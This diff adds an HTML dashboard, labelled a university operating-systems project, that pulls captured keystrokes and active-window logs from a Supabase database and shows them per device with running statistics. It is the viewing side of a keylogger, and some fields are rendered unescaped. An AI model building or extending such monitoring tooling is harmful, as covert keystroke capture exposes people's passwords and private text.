@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enhanced Educational Monitor Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1em;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .status-bar {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .status-item {
+            text-align: center;
+        }
+
+        .status-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #3498db;
+        }
+
+        .status-label {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #ecf0f1;
+        }
+
+        .panel-title {
+            font-size: 1.5em;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .refresh-btn {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+        }
+
+        .log-container {
+            height: 400px;
+            overflow-y: auto;
+            border: 1px solid #bdc3c7;
+            border-radius: 8px;
+            padding: 15px;
+            background: #f8f9fa;
+        }
+
+        .log-entry {
+            background: white;
+            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #3498db;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .log-entry:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .log-entry.keystroke {
+            border-left-color: #e74c3c;
+        }
+
+        .log-entry.activity {
+            border-left-color: #27ae60;
+        }
+
+        .log-timestamp {
+            font-size: 0.8em;
+            color: #7f8c8d;
+            margin-bottom: 5px;
+        }
+
+        .log-content {
+            color: #2c3e50;
+            line-height: 1.4;
+        }
+
+        .log-meta {
+            font-size: 0.85em;
+            color: #95a5a6;
+            margin-top: 8px;
+            font-style: italic;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+            font-size: 1.1em;
+        }
+
+        .error {
+            background: #e74c3c;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .success {
+            background: #27ae60;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .config-panel {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+
+        .config-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            align-items: center;
+        }
+
+        .config-input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #bdc3c7;
+            border-radius: 5px;
+            font-size: 0.9em;
+        }
+
+        .config-btn {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+
+        .config-btn:hover {
+            background: #219a52;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-card {
+            background: linear-gradient(45deg, #f39c12, #e67e22);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.9;
+        }
+
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9em;
+            color: #7f8c8d;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #3498db;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .filter-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: #ecf0f1;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .filter-btn.active {
+            background: #3498db;
+            color: white;
+        }
+
+        .filter-btn:hover {
+            background: #d5dbdb;
+        }
+
+        .filter-btn.active:hover {
+            background: #2980b9;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🖥️ Enhanced Educational Monitor</h1>
+        <div class="subtitle">University Operating Systems Project - Real-time Activity & Keystroke Dashboard</div>
+    </div>
+
+    <div class="container">
+        <!-- Configuration Panel -->
+        <div class="config-panel">
+            <h3>Supabase Configuration</h3>
+            <div class="config-row">
+                <input type="text" id="supabaseUrl" class="config-input" placeholder="Supabase URL" value="">
+                <input type="password" id="supabaseKey" class="config-input" placeholder="Supabase Anon Key" value="">
+                <button onclick="saveConfig()" class="config-btn">Save Config</button>
+            </div>
+            <div class="auto-refresh">
+                <label class="switch">
+                    <input type="checkbox" id="autoRefresh" checked>
+                    <span class="slider"></span>
+                </label>
+                <span>Auto-refresh every 5 seconds</span>
+            </div>
+        </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-value" id="totalLogs">0</div>
+                <div class="status-label">Total Logs</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="keystrokeLogs">0</div>
+                <div class="status-label">Keystroke Sessions</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="activityLogs">0</div>
+                <div class="status-label">Activity Logs</div>
+            </div>
+            <div class="status-item">
+                <div class="status-value" id="lastUpdate">Never</div>
+                <div class="status-label">Last Update</div>
+            </div>
+        </div>
+
+        <!-- Statistics Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalKeysToday">0</div>
+                <div class="stat-label">Keystrokes Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeAppsToday">0</div>
+                <div class="stat-label">Apps Used Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="sessionDuration">0</div>
+                <div class="stat-label">Session Duration (min)</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="deviceCount">0</div>
+                <div class="stat-label">Active Devices</div>
+            </div>
+        </div>
+
+        <!-- Main Dashboard Grid -->
+        <div class="dashboard-grid">
+            <!-- Keystroke Logs Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">🔤 Keystroke Logs</h2>
+                    <button onclick="refreshKeystrokeLogs()" class="refresh-btn">Refresh</button>
+                </div>
+                <div class="filter-bar">
+                    <button class="filter-btn active" onclick="filterKeystrokes('all')">All</button>
+                    <button class="filter-btn" onclick="filterKeystrokes('today')">Today</button>
+                    <button class="filter-btn" onclick="filterKeystrokes('hour')">Last Hour</button>
+                </div>
+                <div class="log-container" id="keystrokeContainer">
+                    <div class="loading">Loading keystroke logs...</div>
+                </div>
+            </div>
+
+            <!-- Activity Logs Panel -->
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">📊 Activity Logs</h2>
+                    <button onclick="refreshActivityLogs()" class="refresh-btn">Refresh</button>
+                </div>
+                <div class="filter-bar">
+                    <button class="filter-btn active" onclick="filterActivity('all')">All</button>
+                    <button class="filter-btn" onclick="filterActivity('today')">Today</button>
+                    <button class="filter-btn" onclick="filterActivity('hour')">Last Hour</button>
+                </div>
+                <div class="log-container" id="activityContainer">
+                    <div class="loading">Loading activity logs...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global configuration
+        let config = {
+            supabaseUrl: localStorage.getItem('supabaseUrl') || '',
+            supabaseKey: localStorage.getItem('supabaseKey') || '',
+            autoRefresh: true,
+            refreshInterval: 5000
+        };
+
+        let refreshTimer;
+        let keystrokeFilter = 'all';
+        let activityFilter = 'all';
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            loadConfig();
+            if (config.supabaseUrl && config.supabaseKey) {
+                startDashboard();
+            } else {
+                showMessage('Please configure Supabase URL and API Key', 'error');
+            }
+        });
+
+        function loadConfig() {
+            document.getElementById('supabaseUrl').value = config.supabaseUrl;
+            document.getElementById('supabaseKey').value = config.supabaseKey;
+            document.getElementById('autoRefresh').checked = config.autoRefresh;
+        }
+
+        function saveConfig() {
+            config.supabaseUrl = document.getElementById('supabaseUrl').value.trim();
+            config.supabaseKey = document.getElementById('supabaseKey').value.trim();
+            config.autoRefresh = document.getElementById('autoRefresh').checked;
+
+            localStorage.setItem('supabaseUrl', config.supabaseUrl);
+            localStorage.setItem('supabaseKey', config.supabaseKey);
+
+            if (config.supabaseUrl && config.supabaseKey) {
+                showMessage('Configuration saved successfully!', 'success');
+                startDashboard();
+            } else {
+                showMessage('Please provide both Supabase URL and API Key', 'error');
+            }
+        }
+
+        function startDashboard() {
+            refreshAllData();
+            setupAutoRefresh();
+        }
+
+        function setupAutoRefresh() {
+            if (refreshTimer) clearInterval(refreshTimer);
+            
+            if (config.autoRefresh) {
+                refreshTimer = setInterval(() => {
+                    refreshAllData();
+                }, config.refreshInterval);
+            }
+        }
+
+        function refreshAllData() {
+            refreshKeystrokeLogs();
+            refreshActivityLogs();
+            updateStatistics();
+            updateLastUpdateTime();
+        }
+
+        async function refreshKeystrokeLogs() {
+            try {
+                const response = await fetch(`${config.supabaseUrl}/rest/v1/key_logs?select=*&order=timestamp.desc&limit=50`, {
+                    headers: {
+                        'apikey': config.supabaseKey,
+                        'Authorization': `Bearer ${config.supabaseKey}`
+                    }
+                });
+
+                if (!response.ok) throw new Error('Failed to fetch keystroke logs');
+
+                const logs = await response.json();
+                displayKeystrokeLogs(logs);
+                updateKeystrokeCount(logs.length);
+            } catch (error) {
+                console.error('Error fetching keystroke logs:', error);
+                document.getElementById('keystrokeContainer').innerHTML = 
+                    '<div class="error">Error loading keystroke logs: ' + error.message + '</div>';
+            }
+        }
+
+        async function refreshActivityLogs() {
+            try {
+                const response = await fetch(`${config.supabaseUrl}/rest/v1/activity_logs?select=*&order=timestamp.desc&limit=100`, {
+                    headers: {
+                        'apikey': config.supabaseKey,
+                        'Authorization': `Bearer ${config.supabaseKey}`
+                    }
+                });
+
+                if (!response.ok) throw new Error('Failed to fetch activity logs');
+
+                const logs = await response.json();
+                displayActivityLogs(logs);
+                updateActivityCount(logs.length);
+            } catch (error) {
+                console.error('Error fetching activity logs:', error);
+                document.getElementById('activityContainer').innerHTML = 
+                    '<div class="error">Error loading activity logs: ' + error.message + '</div>';
+            }
+        }
+
+        function displayKeystrokeLogs(logs) {
+            const container = document.getElementById('keystrokeContainer');
+            
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="loading">No keystroke logs found</div>';
+                return;
+            }
+
+            const filteredLogs = filterLogsByTime(logs, keystrokeFilter);
+            
+            container.innerHTML = filteredLogs.map(log => `
+                <div class="log-entry keystroke">
+                    <div class="log-timestamp">${formatTimestamp(log.timestamp)}</div>
+                    <div class="log-content">
+                        <strong>Keystrokes captured:</strong><br>
+                        <div style="background: #f8f9fa; padding: 10px; margin: 8px 0; border-radius: 5px; font-family: monospace; white-space: pre-wrap; max-height: 100px; overflow-y: auto;">${escapeHtml(log.keystrokes || 'No content')}</div>
+                    </div>
+                    <div class="log-meta">
+                        Device: ${log.device_id} | Window: ${log.window_title || 'Unknown'}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function displayActivityLogs(logs) {
+            const container = document.getElementById('activityContainer');
+            
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="loading">No activity logs found</div>';
+                return;
+            }
+
+            const filteredLogs = filterLogsByTime(logs, activityFilter);
+            
+            container.innerHTML = filteredLogs.map(log => `
+                <div class="log-entry activity">
+                    <div class="log-timestamp">${formatTimestamp(log.timestamp)}</div>
+                    <div class="log-content">
+                        <strong>Application:</strong> ${log.process_name || 'Unknown'}<br>
+                        <strong>Window:</strong> ${log.window_title || 'No title'}
+                    </div>
+                    <div class="log-meta">
+                        Device: ${log.device_id} | Handle: ${log.window_handle || 'N/A'}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function filterLogsByTime(logs, filter) {
+            const now = new Date();
+            
+            switch (filter) {
+                case 'today':
+                    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+                    return logs.filter(log => new Date(log.timestamp) >= today);
+                
+                case 'hour':
+                    const hourAgo = new Date(now.getTime() - 60 * 60 * 1000);
+                    return logs.filter(log => new Date(log.timestamp) >= hourAgo);
+                
+                default:
+                    return logs;
+            }
+        }
+
+        function filterKeystrokes(type) {
+            keystrokeFilter = type;
+            document.querySelectorAll('.panel:first-of-type .filter-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            refreshKeystrokeLogs();
+        }
+
+        function filterActivity(type) {
+            activityFilter = type;
+            document.querySelectorAll('.panel:last-of-type .filter-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            refreshActivityLogs();
+        }
+
+        async function updateStatistics() {
+            try {
+                // Get keystroke stats
+                const keystrokeResponse = await fetch(`${config.supabaseUrl}/rest/v1/key_logs?select=*`, {
+                    headers: {
+                        'apikey': config.supabaseKey,
+                        'Authorization': `Bearer ${config.supabaseKey}`
+                    }
+                });
+                const keystrokeLogs = await keystrokeResponse.json();
+
+                // Get activity stats
+                const activityResponse = await fetch(`${config.supabaseUrl}/rest/v1/activity_logs?select=*`, {
+                    headers: {
+                        'apikey': config.supabaseKey,
+                        'Authorization': `Bearer ${config.supabaseKey}`
+                    }
+                });
+                const activityLogs = await activityResponse.json();
+
+                // Calculate statistics
+                const today = new Date();
+                today.setHours(0, 0, 0, 0);
+
+                const todayKeystrokeLogs = keystrokeLogs.filter(log => new Date(log.timestamp) >= today);
+                const todayActivityLogs = activityLogs.filter(log => new Date(log.timestamp) >= today);
+
+                const totalKeysToday = todayKeystrokeLogs.reduce((sum, log) => sum + (log.keystrokes ? log.keystrokes.length : 0), 0);
+                const uniqueApps = new Set(todayActivityLogs.map(log => log.process_name)).size;
+                const uniqueDevices = new Set([...keystrokeLogs.map(log => log.device_id), ...activityLogs.map(log => log.device_id)]).size;
+
+                // Calculate session duration (hours)
+                const oldestLog = [...keystrokeLogs, ...activityLogs].reduce((oldest, log) => {
+                    const logTime = new Date(log.timestamp);
+                    return logTime < oldest ? logTime : oldest;
+                }, new Date());
+                const sessionDuration = Math.floor((new Date() - oldestLog) / (1000 * 60));
+
+                // Update UI
+                document.getElementById('totalKeysToday').textContent = totalKeysToday;
+                document.getElementById('activeAppsToday').textContent = uniqueApps;
+                document.getElementById('sessionDuration').textContent = sessionDuration;
+                document.getElementById('deviceCount').textContent = uniqueDevices;
+
+            } catch (error) {
+                console.error('Error updating statistics:', error);
+            }
+        }
+
+        function updateKeystrokeCount(count) {
+            document.getElementById('keystrokeLogs').textContent = count;
+        }
+
+        function updateActivityCount(count) {
+            document.getElementById('activityLogs').textContent = count;
+        }
+
+        function updateLastUpdateTime() {
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+        }
+
+        function formatTimestamp(timestamp) {
+            return new Date(timestamp).toLocaleString();
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function showMessage(message, type) {
+            const existingMessage = document.querySelector('.error, .success');
+            if (existingMessage) existingMessage.remove();
+
+            const messageDiv = document.createElement('div');
+            messageDiv.className = type;
+            messageDiv.textContent = message;
+            
+            const container = document.querySelector('.container');
+            container.insertBefore(messageDiv, container.firstChild);
+
+            setTimeout(() => messageDiv.remove(), 5000);
+        }
+
+        // Auto-refresh toggle
+        document.getElementById('autoRefresh').addEventListener('change', function() {
+            config.autoRefresh = this.checked;
+            setupAutoRefresh();
+        });
+
+        // Update total logs count
+        function updateTotalLogs() {
+            const keystrokeCount = parseInt(document.getElementById('keystrokeLogs').textContent) || 0;
+            const activityCount = parseInt(document.getElementById('activityLogs').textContent) || 0;
+            document.getElementById('totalLogs').textContent = keystrokeCount + activityCount;
+        }
+
+        // Call updateTotalLogs after updating individual counts
+        const originalUpdateKeystrokeCount = updateKeystrokeCount;
+        const originalUpdateActivityCount = updateActivityCount;
+
+        updateKeystrokeCount = function(count) {
+            originalUpdateKeystrokeCount(count);
+            updateTotalLogs();
+        };
+
+        updateActivityCount = function(count) {
+            originalUpdateActivityCount(count);
+            updateTotalLogs();
+        };
+    </script>
+</body>
+</html>
